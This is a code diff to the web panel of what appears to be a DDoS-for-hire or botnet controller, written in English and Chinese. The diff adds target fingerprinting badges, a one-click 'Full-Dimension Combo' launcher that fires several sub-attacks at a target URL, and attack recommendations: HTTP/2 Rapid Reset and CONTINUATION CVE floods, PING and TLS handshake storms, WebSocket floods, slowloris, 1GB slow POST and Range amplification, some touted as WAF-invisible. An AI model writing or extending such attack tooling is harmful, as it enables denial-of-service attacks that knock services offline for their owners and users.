@@ -347,6 +347,15 @@
             <span x-show="l7Test.result.fingerprint.bomb_vuln" style="background:rgba(255,60,60,.15);color:#f66;border:1px solid #f66;border-radius:3px;padding:2px 8px">⚠ HPACK Bomb (CVE-2026-49975)</span>
             <span x-show="!l7Test.result.fingerprint.vulnerable && !l7Test.result.fingerprint.continuation_vuln && !l7Test.result.fingerprint.bomb_vuln" style="color:var(--green)" x-text="'✓ '+t('l7_no_vuln')"></span>
           </div>
+          <!-- 能力徽章（推荐依据） -->
+          <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+            <span x-show="l7Test.result.fingerprint.http2 || l7Test.result.fingerprint.http2c" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:10px">HTTP/2</span>
+            <span x-show="l7Test.result.fingerprint.ws" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:10px">WebSocket</span>
+            <span x-show="l7Test.result.fingerprint.slow_applicable" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:10px">无请求头超时</span>
+            <span x-show="l7Test.result.fingerprint.static_range" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:10px">静态/Range</span>
+            <span x-show="l7Test.result.fingerprint.tls_issuer" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:10px">TLS</span>
+            <span x-show="l7Test.result.fingerprint.body_size > 0" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:10px" x-text="'首页 '+formatNum(l7Test.result.fingerprint.body_size)+'B'"></span>
+          </div>
           <!-- 探测备注 -->
           <div x-show="l7Test.result.fingerprint.notes && l7Test.result.fingerprint.notes.length" style="margin-top:8px;opacity:0.7;font-size:10px">
             <template x-for="(n,i) in l7Test.result.fingerprint.notes" :key="i">
@@ -365,7 +374,10 @@
             <button class="btn sm" @click="launchL7Rec(rec)" style="flex:0;white-space:nowrap" x-text="t('l7_launch')"></button>
           </div>
         </template>
-        <button class="btn" @click="launchL7Best()" style="margin-top:8px;width:100%" x-text="t('l7_launch_best')"></button>
+        <div style="display:flex;gap:6px;margin-top:8px">
+          <button class="btn" @click="launchL7Best()" style="flex:1" x-text="t('l7_launch_best')"></button>
+          <button class="btn" @click="launchL7Combo()" :disabled="!l7Test.result.combo || !l7Test.result.combo.length" style="flex:1" x-text="t('l7_launch_combo')"></button>
+        </div>
       </div>
     </template>
   </div>
@@ -930,11 +942,18 @@ function app() {
       update_all_started:'Upgrade started: Workers updating, Controller will restart in a few seconds.',
       l7_recon:'L7 Recon & Attack Recommendations', l7_target_ph:'Target URL (http:// or https://)', l7_test_btn:'Probe', l7_testing:'Probing target: HTTP/2 support (ALPN/h2c), response headers, CVE version tables...',
       l7_error_required:'Enter a target URL first',
-      l7_recs:'Recommended attacks — CVE first, traffic fallback', l7_best:'BEST', l7_launch:'Launch', l7_launch_best:'🚀 Launch Top Recommendation',
+      l7_recs:'Recommended attacks — CVE first, capability-based, traffic fallback', l7_best:'BEST', l7_launch:'Launch', l7_launch_best:'🚀 Launch Top Recommendation', l7_launch_combo:'🧩 Launch Full-Dimension Combo',
       l7_no_vuln:'No known HTTP/2 CVE weakness detected', l7_proto:'Protocol', l7_server:'Server', l7_product:'Product', l7_version:'Version', l7_tls:'TLS Issuer',
       l7_rec_bomb:'HPACK Bomb vulnerable (IIS kernel-mode / unpatched) — highest impact; auto-gated on server side',
       l7_rec_reset:'CVE-2023-44487 Rapid Reset — target version vulnerable',
       l7_rec_cont:'CONTINUATION Flood (CVE-2024-27316 etc.) — target version vulnerable',
+      l7_rec_h2ping:'HTTP/2 PING frame storm — target must ACK (2x amp), WAF-invisible',
+      l7_rec_tls:'TLS handshake storm — ECDHE key exchange burns target CPU (LAN-strong)',
+      l7_rec_wsslow:'WebSocket endpoint found — hold connections to drain the WS connection table',
+      l7_rec_wsflood:'WebSocket message flood — frame parsing + broadcast CPU',
+      l7_rec_slowloris:'Server holds partial headers — slowloris connection stall works',
+      l7_rec_slowpost:'Slow POST body stall — drain worker threads with 1GB Content-Length',
+      l7_rec_range:'Static/Range content detected — response amplification (target emits large bodies)',
       l7_rec_http:'Generic HTTP flood — raw fire-and-forget writes, not RTT-bound',
       l7_rec_post:'POST flood — business-layer pressure (DB/log), bypasses GET-only filters',
       l7_rec_h2:'HTTP/2 flood — multiplexed stream pressure (target supports HTTP/2)',
@@ -1009,11 +1028,18 @@ function app() {
       update_all_started:'升级已开始：Worker 正在更新，Controller 几秒后自动重启。',
       l7_recon:'L7 侦察与攻击推荐', l7_target_ph:'目标 URL (http:// 或 https://)', l7_test_btn:'检测', l7_testing:'正在探测：HTTP/2 支持 (ALPN/h2c)、响应头、CVE 版本表...',
       l7_error_required:'请先输入目标 URL',
-      l7_recs:'推荐攻击 —— CVE 优先，流量型兜底', l7_best:'首选', l7_launch:'发起', l7_launch_best:'🚀 一键发起首选推荐',
+      l7_recs:'推荐攻击 —— CVE 优先，能力推荐，流量兜底', l7_best:'首选', l7_launch:'发起', l7_launch_best:'🚀 一键发起首选推荐', l7_launch_combo:'🧩 一键发起全维度组合',
       l7_no_vuln:'未发现已知 HTTP/2 CVE 脆弱点', l7_proto:'协议', l7_server:'Server', l7_product:'组件', l7_version:'版本', l7_tls:'TLS 签发者',
       l7_rec_bomb:'HPACK Bomb 脆弱（IIS 内核态 / 未修复版本）—— 影响最大；服务端自动门控兜底',
       l7_rec_reset:'CVE-2023-44487 Rapid Reset —— 目标版本存在漏洞',
       l7_rec_cont:'CONTINUATION 洪水 (CVE-2024-27316 等) —— 目标版本存在漏洞',
+      l7_rec_h2ping:'HTTP/2 PING 帧风暴 —— 目标必须回 ACK（2x 放大），WAF 无感',
+      l7_rec_tls:'TLS 握手风暴 —— ECDHE 密钥交换烧目标 CPU（内网更强）',
+      l7_rec_wsslow:'检测到 WebSocket 端点 —— 连接占坑，耗尽 WS 连接表',
+      l7_rec_wsflood:'WebSocket 消息洪泛 —— 帧解析 + 广播 CPU',
+      l7_rec_slowloris:'目标保持不完整请求头 —— Slowloris 连接占坑有效',
+      l7_rec_slowpost:'Slow POST 请求体占坑 —— 1GB Content-Length 拖死 worker 线程',
+      l7_rec_range:'检测到静态/Range 内容 —— 响应放大（目标自己吐大流量）',
       l7_rec_http:'通用 HTTP 洪水 —— RAW 连续写入，不受 RTT 限制',
       l7_rec_post:'POST 洪水 —— 业务层压力（数据库/日志），绕过只挡 GET 的防护',
       l7_rec_h2:'HTTP/2 洪水 —— 多路复用流压力（目标支持 HTTP/2）',
@@ -1325,6 +1351,19 @@ function app() {
     launchL7Best() {
       const recs = this.l7Test.result && this.l7Test.result.recommendations;
       if (recs && recs.length) this.launchL7Rec(recs[0]);
+    },
+    // 一键全维度组合：按检测能力组装 combo 子攻击并直接发起
+    launchL7Combo() {
+      const combo = this.l7Test.result && this.l7Test.result.combo;
+      if (!combo || !combo.length) return;
+      this.form.method = 'combo';
+      this.form.target = this.l7Test.target;
+      this.form.sub_attacks = combo.map(s => ({
+        method: s.method, threads: s.threads, packet_size: 1400,
+        rate_limit_pps: 0, rate_limit_bps: 0, game: '', burst_mode: false, jitter_ms: 0,
+      }));
+      document.querySelector('.layout') && document.querySelector('.layout').scrollIntoView({behavior:'smooth'});
+      this.startAttack();
     },
 
     async startScan() {
